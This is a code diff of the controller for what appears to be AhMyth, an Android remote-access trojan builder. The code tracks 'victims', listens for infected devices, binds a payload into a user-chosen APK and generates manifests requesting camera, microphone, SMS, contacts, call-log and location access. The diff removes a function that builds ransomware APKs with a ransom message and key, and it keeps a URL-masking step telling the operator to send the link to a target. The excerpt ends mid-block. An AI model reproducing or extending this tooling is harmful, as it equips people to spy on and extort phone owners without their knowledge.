@@ -7,8 +7,6 @@ var victimsList = remote.require('./main');
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var homeDir = require('homedir');
 var path = require("path");
-const { title } = require('process');
-const { Socket } = require('socket.io-client');
 var exec = require('child_process').exec, child;
 //--------------------------------------------------------------
 var viclist = {};
@@ -42,17 +40,21 @@ app.controller("AppCtrl", ($scope) => {
         window.minimize();
     };
 
+    $appCtrl.maximize = () => {
+      window.maximize();
+    };
+
     // when user clicks Listen button
     $appCtrl.Listen = (port) => {
         if (!port) {
             port = CONSTANTS.defaultPort;
-    }
+        }
 
         // notify the main proccess about the port and let him start listening
         ipcRenderer.send("SocketIO:Listen", port);
         $appCtrl.Log("Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
     }
-  
+
 
     // fired when main proccess (main.js) sends any new notification about new victim
     ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
@@ -85,6 +87,13 @@ app.controller("AppCtrl", ($scope) => {
         ipcRenderer.send('openLabWindow', 'lab.html', index);
     }
 
+    // stop listening when user clicks the Stop button
+    $appCtrl.Stop = (event) => {
+        ipcRenderer.removeAllListeners("SocketIO:Listen", event);
+        $appCtrl.Log("Stopped listening");
+      }
+
+
     // app logs to print any new log in the black terminal
     $appCtrl.Log = (msg, status) => {
         var fontColor = CONSTANTS.logColors.DEFAULT;
@@ -99,115 +108,60 @@ app.controller("AppCtrl", ($scope) => {
             $appCtrl.$apply();
     }
 
-    // stop listening when user clicks the Stop button
-    $appCtrl.Stop = (port) => {
-        ipcRenderer.removeAllListeners("SocketIO:Listen", port);
-        $appCtrl.Log("Stopped listening");
-    }
+  //function to open the dialog and choose apk to be bound
+  $appCtrl.BrowseApk = () => {
+      dialog.showOpenDialog({ 
+          properties: ['openFile'], 
+          title: 'Choose APK to bind', 
+          buttonLabel: 'Select APK',
+          filters: [
+              { name: 'Android APK', extensions: ['apk'] } // only select apk files
+          ]
+      }).then(result => { 
+          if(result.canceled) {
+              $appCtrl.Log("No file selected"); //if user cancels the dialog
+          } else {
+              $appCtrl.Log("File choosen  " + result.filePaths[0]); //if user selects an APK file
+              readFile(result.filePaths[0]); 
+          }
+      }).catch(() => { 
+          $appCtrl.Log("No file selected"); 
+      })
 
+      function readFile(filepath) {
+          $appCtrl.filePath = filepath;
+          $appCtrl.$apply();
+      }
+  }
 
-    //function to open the dialog and choose apk to be binded
-    $appCtrl.BrowseApk = () => {
-        dialog.showOpenDialog({ 
-            properties: ['openFile'], 
-            title: 'Choose APK to bind', 
-            filters: [
-                { name: 'Android APK', extensions: ['apk'] } // only select apk files
-            ]
-        }).then(result => { 
-            if(result.canceled) {
-                $appCtrl.Log("No file selected"); //if user cancels the dialog
-            } else {
-                $appCtrl.Log("File choosen  " + result.filePaths[0]); //if user selects an APK file
-                readFile(result.filePaths[0]); 
-            }
-        }).catch(() => { 
-            $appCtrl.Log("No file selected"); 
-        })
-
-        function readFile(filepath) {
-            $appCtrl.filePath = filepath;
-            $appCtrl.$apply();
-        }
-    }
-
-    // function to select decompiled APK folder for retry function
-    $appCtrl.BrowseFolder = () => { 
-        dialog.showOpenDialog({
-            properties: ['openDirectory'],
-            title: 'Choose decompiled APK folder'
-        }).then(result => {
-            if(result.canceled) {
-                $appCtrl.Log("No folder selected");
-            } else {
-                $appCtrl.Log("Folder choosen " + result.filePaths[0]);
-                $appCtrl.decompiledFolder = result.filePaths[0];
-                $appCtrl.$apply();
-            }
-        }).catch(() => {
-            $appCtrl.Log("No folder selected");
-        })
-    }
-  
-    // function to run sara python file
-    $appCtrl.callsarapy = () => {
-          $appCtrl.Log('Getting Icon from path input ', '..');
-          var iconransome = document.getElementById('icon').value
-          $appCtrl.Log('Applying APK name from input ', '..');
-          var nameransome = document.getElementById('name').value
-          $appCtrl.Log('Applying APK title from input ', '..');
-          var titleransome = document.getElementById('title').value
-          $appCtrl.Log('Inserting Ransomware title from input ', '..');
-          var descransome = document.getElementById('desc').value
-          $appCtrl.Log('Inserting Ransomware description from input ', '..');
-          var keyransome = document.getElementById('key').value
-          $appCtrl.Log('Building Ransomware APK ', '..');
-          var createRansom = exec("cd SARA && python3 sara.py "+iconransome+" "+nameransome+" "+titleransome+" "+descransome+" "+keyransome,
-            function (error, stdout, stderr) {
-               // console.log('stdout: ' + stdout);
-               // console.log('stderr: ' + stderr);
-                if (error !== null) {
-                    if (iconransome.length == 0){
-                        $appCtrl.Log('Please input the path to the PNG to be used', CONSTANTS.logStatus.FAIL);
-                        }
-                    if (nameransome.length == 0){
-                        $appCtrl.Log('Please input the name of the APK to be used', CONSTANTS.logStatus.FAIL);
-                        }
-                    if (titleransome.length == 0){
-                        $appCtrl.Log('Please Input an Encryption Message Title', CONSTANTS.logStatus.FAIL);
-                        }
-                    if (descransome.length == 0){
-                        $appCtrl.Log('Please type out the Encryption Message', CONSTANTS.logStatus.FAIL);
-                        }
-                    if (keyransome.length == 0){
-                        $appCtrl.Log('Please Input a Decryption Key', CONSTANTS.logStatus.FAIL);
-                        }
-                        $appCtrl.Log('Ransomware Build Failed', CONSTANTS.logStatus.FAIL);
-                        return;
-                        
-                      }
-                      $appCtrl.Log('Ransomware APK Created Successfully', CONSTANTS.logStatus.SUCCESS);
-                      $appCtrl.Log('The Ransomware APK has been built on: ' + 'AhMyth/AhMyth-Server/SARA/' + CONSTANTS.logStatus.SUCCESS);
- ;
-                });
-            }
-        //function to locate ransom
-    $appCtrl.Check = () => {
-        var nameransome = document.getElementById('name').value
-        var pathrans = "SARA/"+nameransome+".apk";
-        if (fs.existsSync(pathrans)) {
-            $appCtrl.Log('Ransomware Built Successfully ', CONSTANTS.logStatus.SUCCESS);
-            $appCtrl.Log('The APK has been built on ' + 'AhMyth/AhMyth-Server/SARA/'+nameransome+".apk", CONSTANTS.logStatus.SUCCESS);}
-
-    }
+  // function to select decompiled APK folder for retry function
+  $appCtrl.BrowseFolder = () => { 
+      dialog.showOpenDialog({
+          properties: ['openDirectory'],
+          title: 'Choose decompiled APK folder',
+          buttonLabel: 'Select Folder',
+          filters: [
+              { name: 'Folders', extensions: ['*'] }
+          ]
+      }).then(result => {
+          if(result.canceled) {
+              $appCtrl.Log("No folder selected");
+          } else {
+              $appCtrl.Log("Folder choosen " + result.filePaths[0]); //if user selects a Decompiled APK file
+              $appCtrl.decompiledFolder = result.filePaths[0];
+              $appCtrl.$apply();
+          }
+      }).catch(() => {
+          $appCtrl.Log("No folder selected");
+      })
+  }
 
     // function to run mask python file
-
     $appCtrl.callmaskpy = () => {
           var targetmask = document.getElementById('targeturl').value
           var hiddenmask = document.getElementById('hiddenurl').value          
           var keywordmask = "-"
-          child = exec("cd maskurl && python3 maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
+          child = exec("python3 ./app/app/Factory/maskurl.py --target "+targetmask+" --mask "+hiddenmask+" --keywords "+keywordmask,
             function (error, stdout, stderr) {
                 //console.log('stdout: ' + stdout);
                 //console.log('stderr: ' + stderr);
@@ -222,7 +176,8 @@ app.controller("AppCtrl", ($scope) => {
                         
                     }
                 if (stdout.length != 0) {
-                    $appCtrl.Log(stdout+"     Just Copy This Url And Send It To Your Target ;)");
+                    $appCtrl.Log('Just Copy This Url And Send It To Your Target', CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log(stdout);
 
                     //console.log('exec error: ' + error);
                     return;
@@ -235,72 +190,5276 @@ app.controller("AppCtrl", ($scope) => {
 
 
     // function to build the apk and sign it
-    $appCtrl.GenerateApk = (apkFolder) => { 
+    $appCtrl.GenerateApk = (apkFolder) => {
+        var checkBoxofCamera = document.getElementById("Permissions1");
+        var checkBoxofStorage = document.getElementById("Permissions2");
+        var checkBoxofMic = document.getElementById("Permissions3");
+        var checkBoxofLocation = document.getElementById("Permissions4");
+        var checkBoxofContacts = document.getElementById("Permissions5");
+        var checkBoxofSms = document.getElementById("Permissions6"); 
+        var checkBoxofCallsLogs = document.getElementById("Permissions7");
+        //if all unchecked
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = CONSTANTS.permissions
+        }
+        //if all checked
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = CONSTANTS.permissions
+        }
+        //if only one selected
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>            
+`
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>           
+    ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        
+    ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>       
+    ` 
+        }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
+        }        
 
-      $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
-      var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-          (error, stdout, stderr) => {
-              if (error !== null) {
-                  $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
-                  return;
-              }
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>   
+            `
+        }        
+        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>   
+            ` 
+        }  
+        //if six checked
+        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>  
+            ` 
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`          
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
+        }  
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         ` 
+        }
+        //if two are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
+        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
